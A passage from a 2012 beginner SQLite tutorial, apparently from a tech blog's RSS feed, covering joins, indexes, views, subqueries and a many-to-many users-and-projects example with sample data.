<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">TABLE</span> continents (
  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
  continent_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
);
<span class="kw">CREATE</span> <span class="kw">TABLE</span> countries (
  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
  continent_id <span class="dt">INTEGER</span> <span class="kw">NOT</span> <span class="kw">NULL</span>,
  country_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
);
<span class="kw">CREATE</span> <span class="kw">TABLE</span> cities (
  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
  country_id <span class="dt">INTEGER</span> <span class="kw">NOT</span> <span class="kw">NULL</span>,
  city_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
);</code></pre>
<p>Note: SQL experts will notice something is missing from the table definitions above. I have deliberately chosen not to cover foreign key constraints in this beginner-level tutorial in order not to place too much of a cognitive burden on the reader.</p>
<p>Let’s populate these tables with some data I have prepared for you in a file.</p>
<p>Quit SQLite with Ctrl-D, download and inspect the file as shown below:</p>
<pre><code>wget -O /tmp/geography.sql http://dserban.github.com/introduction-to-sql/geography.sql
less /tmp/geography.sql</code></pre>
<p>Load the data into our database <code>dev.db</code> (this operation may take a while on slower computers):</p>
<pre><code>sqlite3 /tmp/dev.db &lt; /tmp/geography.sql</code></pre>
<p>Now open the database again and let’s write some queries.</p>
<pre><code>sqlite3 /tmp/dev.db</code></pre>
<p>The query:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> continents;</code></pre>
<p>behaves the way you expect.</p>
<p>Next, go ahead and run the query below, and see what happens:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> continents <span class="kw">AS</span> c1, continents <span class="kw">AS</span> c2;</code></pre>
<p>The above is definitely a valid SQL statement, and I’m just showing it to you in order for you to get comfortable with the idea that SQL statements may reference more than one database table, and if you reference the same table twice, the output will be the cartesian product of the table’s row set with itself.</p>
<p>Next, try this:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
  country_name, continent_name
<span class="kw">FROM</span>
  countries, continents
<span class="kw">WHERE</span>
  countries.continent_id = continents.id
<span class="kw">ORDER</span> <span class="kw">BY</span>
  country_name;</code></pre>
<p>What we just did is formally called “traversing a foreign key relationship”.</p>
<p>We retrieved some records from the <code>countries</code> table, found some “pointers” in the <code>continent_id</code> column, went to the <code>continents</code> table, retrieved the continent descriptions pertaining to those pointers, and then brought back those results and associated them with each row in the <code>countries</code> table.</p>
<p>Congratulations, you have just learned about the “R” in “RDBMS”, this is what we mean by “relational”.</p>
<p>Notice one thing: the query above will start suffering from performance issues for tables beyond a certain size.</p>
<p>Before we go on, we want to take care of performance-by-design.</p>
<p>The lookups which happen during foreign key relationship traversal would be much more efficient when supported by the appropriate indexes.</p>
<p>Let’s create indexes on those foreign key columns.</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_country_id   <span class="kw">ON</span> cities    (country_id);
<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_continent_id <span class="kw">ON</span> countries (continent_id);</code></pre>
<p>Moreover, <code>country_name</code> and <code>city_name</code> are also worth indexing, since in the future we are very likely to need to locate records based on them.</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_city_name    <span class="kw">ON</span> cities    (city_name);
<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_country_name <span class="kw">ON</span> countries (country_name);</code></pre>
<p>Let us now write a query that performs a three-way join:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
  city_name, country_name, continent_name
<span class="kw">FROM</span>
  cities, countries, continents
<span class="kw">WHERE</span>
  cities.country_id = countries.id
  <span class="kw">AND</span>
  countries.continent_id = continents.id
<span class="kw">ORDER</span> <span class="kw">BY</span>
  city_name;</code></pre>
<p>In order to avoid repeated typing of complex queries, SQL allows us to store a given <code>SELECT</code> statement under a specific name.</p>
<p>The resulting database object is called a view.</p>
<p>Let’s create a view for the previous <code>SELECT</code> statement:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">VIEW</span> augmented_cities <span class="kw">AS</span>
<span class="kw">SELECT</span>
  city_name, country_name, continent_name
<span class="kw">FROM</span>
  cities, countries, continents
<span class="kw">WHERE</span>
  cities.country_id = countries.id
  <span class="kw">AND</span>
  countries.continent_id = continents.id;</code></pre>
<p>Using the newly created view, we can more comfortably find out all of the information about e.g. the city of London which our database has to offer:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> augmented_cities <span class="kw">WHERE</span> city_name = <span class="st">&#39;London&#39;</span>;</code></pre>
<p>The output:</p>
<pre><code>London|United Kingdom|Europe</code></pre>
<p>Next, let’s look at an example of a subquery. Try this:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
  continent_name, how_many_countries
<span class="kw">FROM</span>
  continents,
  (<span class="kw">SELECT</span> continent_id, <span class="fu">COUNT</span>(*) <span class="kw">AS</span> how_many_countries <span class="kw">FROM</span> countries <span class="kw">GROUP</span> <span class="kw">BY</span> continent_id) <span class="kw">AS</span> breakdows
<span class="kw">WHERE</span>
  continents.id = breakdows.continent_id;</code></pre>
<p>The output:</p>
<pre><code>North America|4
South America|9
Europe|32
Africa|15
Asia|17
Oceania|2</code></pre>
<p>What we did here is we joined a real table (<code>continents</code>) with a virtual one called a subquery (the result of a <code>SELECT</code> statement).</p>
<p>We can do this because SQL doesn’t really join tables, it joins rectangular result sets consisting of rows and columns.</p>
<p>Let’s store this query in a view, we are going to make use of it in a future tutorial.</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">VIEW</span> continent_statistics <span class="kw">AS</span>
<span class="kw">SELECT</span>
  continent_name, how_many_countries
<span class="kw">FROM</span>
  continents,
  (<span class="kw">SELECT</span> continent_id, <span class="fu">COUNT</span>(*) <span class="kw">AS</span> how_many_countries <span class="kw">FROM</span> countries <span class="kw">GROUP</span> <span class="kw">BY</span> continent_id) <span class="kw">AS</span> breakdows
<span class="kw">WHERE</span>
  continents.id = breakdows.continent_id;</code></pre>
</section>
<section id="foreign-key-relationships-the-many-to-many-case" class="level3">
<h3>Foreign key relationships: the MANY-TO-MANY case</h3>
<p>Up to this point, we have explored SQL statements on a single table, as well as one-to-many relationships.</p>
<p>How do we model many-to-many relationships?</p>
<p>How do we model people upvoting news stories on social networks?</p>
<ul>
<li>One person may upvote more than one story</li>
</ul>
<p>Conversely:</p>
<ul>
<li>One story may get upvoted by several people</li>
</ul>
<p>How do we model project communities which collaborate on Github?</p>
<ul>
<li>One person may contribute to more than one project</li>
</ul>
<p>Conversely:</p>
<ul>
<li>One project may get contributions from several people</li>
</ul>
<p>The answer is that we need to define a separate information entity which is going to track those complex relationships for us.</p>
<p>In Github’s case, the core information entities are User and Project, and we are going to name the third one Contributorship.</p>
<p>Therefore:</p>
<ul>
<li>A user has many contributorships</li>
<li>A contributorship belongs to a user</li>
<li>A project has many contributorships</li>
<li>A contributorship belongs to a project</li>
</ul>
<p>Let’s go ahead and create tables for those three information entities:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">TABLE</span> users (
  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
  user_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
);
<span class="kw">CREATE</span> <span class="kw">TABLE</span> projects (
  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
  project_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>)
);
<span class="kw">CREATE</span> <span class="kw">TABLE</span> contributorships (
  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
  user_id <span class="dt">INTEGER</span> <span class="kw">NOT</span> <span class="kw">NULL</span>,
  project_id <span class="dt">INTEGER</span> <span class="kw">NOT</span> <span class="kw">NULL</span>
);</code></pre>
<p>And let’s populate the tables with some sample data (5 users, 9 projects):</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">1</span>, <span class="ot">&quot;alex-morega&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">2</span>, <span class="ot">&quot;gvoicu&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">3</span>, <span class="ot">&quot;igstan&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">4</span>, <span class="ot">&quot;dserban&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> users <span class="kw">VALUES</span> (<span class="dv">5</span>, <span class="ot">&quot;torvalds&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">1</span>, <span class="ot">&quot;torvalds/linux&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">2</span>, <span class="ot">&quot;rosedu/WebDev&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">3</span>, <span class="ot">&quot;rosedu/wouso&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">4</span>, <span class="ot">&quot;rosedu/techblog&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">5</span>, <span class="ot">&quot;rosedu/StartTheDark&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">6</span>, <span class="ot">&quot;gvoicu/miniflow&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">7</span>, <span class="ot">&quot;rails/rails&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">8</span>, <span class="ot">&quot;sinatra/sinatra&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> projects <span class="kw">VALUES</span> (<span class="dv">9</span>, <span class="ot">&quot;mitsuhiko/flask&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">1</span>, <span class="dv">1</span>, <span class="dv">2</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">2</span>, <span class="dv">1</span>, <span class="dv">3</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">3</span>, <span class="dv">1</span>, <span class="dv">9</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">4</span>, <span class="dv">2</span>, <span class="dv">2</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">5</span>, <span class="dv">2</span>, <span class="dv">6</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">6</span>, <span class="dv">2</span>, <span class="dv">7</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">7</span>, <span class="dv">2</span>, <span class="dv">8</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">8</span>, <span class="dv">3</span>, <span class="dv">2</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> ( <span class="dv">9</span>, <span class="dv">3</span>, <span class="dv">6</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">10</span>, <span class="dv">4</span>, <span class="dv">1</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">11</span>, <span class="dv">4</span>, <span class="dv">2</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">12</span>, <span class="dv">4</span>, <span class="dv">3</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">13</span>, <span class="dv">4</span>, <span class="dv">4</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">14</span>, <span class="dv">4</span>, <span class="dv">5</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">15</span>, <span class="dv">4</span>, <span class="dv">6</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">16</span>, <span class="dv">4</span>, <span class="dv">7</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">17</span>, <span class="dv">4</span>, <span class="dv">8</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> contributorships <span class="kw">VALUES</span> (<span class="dv">18</span>, <span class="dv">5</span>, <span class="dv">1</span>);</code></pre>
<p>Now before we start issuing queries, let’s take care of the performance-by-design side of things.</p>
<p>We anticipate that we’ll need to do heavy querying by <code>user_name</code> and by <code>project_name</code>.</p>
<p>Therefore we need indexes on those columns:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_user_name    <span class="kw">ON</span> users    (user_name);
<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_project_name <span class="kw">ON</span> projects (project_name);</code></pre>
<p>It goes without saying that we need to index the foreign key columns:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_user_id    <span class="kw">ON</span> contributorships (user_id);
<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_project_id <span class="kw">ON</span> contributorships (project_id);</code></pre>
<p>We also need to make sure that duplicate contributorships cannot exist.</p>
<p>We achieve this by creating a unique index on the combination of <code>user_id</code> and <code>project_id</code>:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">UNIQUE</span> <span class="kw">INDEX</span> unique_index_on_user_id_and_project_id <span class="kw">ON</span> contributorships (user_id,project_id);</code></pre>
<p>First, let’s list all contributorships in human readable format:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
  user_name || <span class="ot">&quot; contributes to &quot;</span> || project_name
<span class="kw">FROM</span>
  contributorships,
  users,
  projects
<span class="kw">WHERE</span>
  users.id = contributorships.user_id
  <span class="kw">AND</span>
  projects.id = contributorships.project_id
<span class="kw">ORDER</span> <span class="kw">BY</span>
  user_name, project_name;</code></pre>
<p>The output you should get is:</p>
<pre><code>alex-morega contributes to mitsuhiko/flask
alex-morega contributes to rosedu/WebDev
alex-morega contributes to rosedu/wouso
dserban contributes to gvoicu/miniflow
dserban contributes to rails/rails
dserban contributes to rosedu/StartTheDark
dserban contributes to rosedu/WebDev
dserban contributes to rosedu/techblog
dserban contributes to rosedu/wouso
dserban contributes to sinatra/sinatra
dserban contributes to torvalds/linux
gvoicu contributes to gvoicu/miniflow
gvoicu contributes to rails/rails
gvoicu contributes to rosedu/WebDev
gvoicu contributes to sinatra/sinatra
igstan contributes to gvoicu/miniflow
igstan contributes to rosedu/WebDev
torvalds contributes to torvalds/linux</code></pre>
<p>Now let’s determine all projects for a given user, as well as the list of all people who contribute to a given project.</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
  project_name
<span class="kw">FROM</span>
  contributorships,
  users,
  projects
<span class="kw">WHERE</span>
  users.user_name = <span class="st">&#39;gvoicu&#39;</span>
  <span class="kw">AND</span>
  users.id = contributorships.user_id
  <span class="kw">AND</span>
  projects.id = contributorships.project_id
<span class="kw">ORDER</span> <span class="kw">BY</span>
  project_name;</code></pre>
<p>The output you should get is:</p>
<pre><code>gvoicu/miniflow
rails/rails
rosedu/WebDev
sinatra/sinatra</code></pre>
<p>To list a given project’s contributors:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
  user_name
<span class="kw">FROM</span>
  contributorships,
  users,
  projects
<span class="kw">WHERE</span>
  projects.project_name = <span class="st">&#39;rosedu/WebDev&#39;</span>
  <span class="kw">AND</span>
  users.id = contributorships.user_id
  <span class="kw">AND</span>
  projects.id = contributorships.project_id
<span class="kw">ORDER</span> <span class="kw">BY</span>
  user_name;</code></pre>
<p>The output you should get is:</p>
<pre><code>alex-morega
dserban
gvoicu
igstan</code></pre>
<p>Finally, let’s create a view which will make it easier for us to go back and forth between users and projects:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">VIEW</span> augmented_contributorships <span class="kw">AS</span>
<span class="kw">SELECT</span>
  user_name, project_name
<span class="kw">FROM</span>
  contributorships,
  users,
  projects
<span class="kw">WHERE</span>
  users.id = contributorships.user_id
  <span class="kw">AND</span>
  projects.id = contributorships.project_id;</code></pre>
</section>
<section id="closing-words" class="level3">
<h3>Closing words</h3>
<p>This short overview of SQL ends here.</p>
<p>If you want to learn more SQL tips and tricks, I highly recommend <a href="http://sql.learncodethehardway.org/book/">Learn SQL The Hard Way</a></p>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Fri, 05 Oct 2012 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/sql.html</guid>
</item>

    </channel> 
</rss>
